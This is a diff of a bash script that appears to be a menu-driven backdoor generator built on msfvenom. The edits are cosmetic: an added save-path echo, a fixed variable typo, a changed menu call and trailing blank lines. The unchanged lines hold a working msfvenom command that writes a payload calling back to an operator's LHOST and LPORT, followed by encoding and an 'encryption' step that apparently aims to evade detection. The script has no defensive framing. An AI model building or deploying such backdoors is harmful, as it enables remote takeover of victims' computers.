@@ -171,6 +171,7 @@ echo -e $lightaqua"Encoder : $lightred$encoder"
 echo -e $lightaqua"Backdoor Type : $lightred$backdoor"
 echo -e $lightaqua"Format / Platform : $lightred$format$lightaqua / $lightred$platform"
 echo -e $lightaqua"Name : $lighred$name"
+echo -e $lightaqua"Save : $lightred/root/Desktop/$name.$format"
 msfvenom --platform $platform -p $backdoor LHOST=$ip LPORT=$port -b "\x00\ffx" -e $encoder -f $format > /root/Desktop/$name.$format
 clear
 
@@ -230,7 +231,7 @@ then
   echo -e $lightaqua"Encoder : $lightred$encoder"
   echo -e $lightaqua"Backdoor Type : $lightred$backdoor"
   echo -e $lightaqua"Format / Platform : $lightred$format$lightaqua / $lightred$platform"
-  echo -e $lightaqua"Name : $lighred$name"
+  echo -e $lightaqua"Name : $lightred$name"
   cd /root/Desktop/ 
   echo -e $purple"[i]Launching Encryption ..."
   sleep 2
@@ -243,8 +244,39 @@ then
   echo -e $lightgreen"[✔]Finish encrypting!"
   sleep 1
   read -p $lightyellow"Press any keys to continue ..."$normal
-  procep
+  cd $localdir/ && ./procepmenu.sh
 fi
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
 
 
 
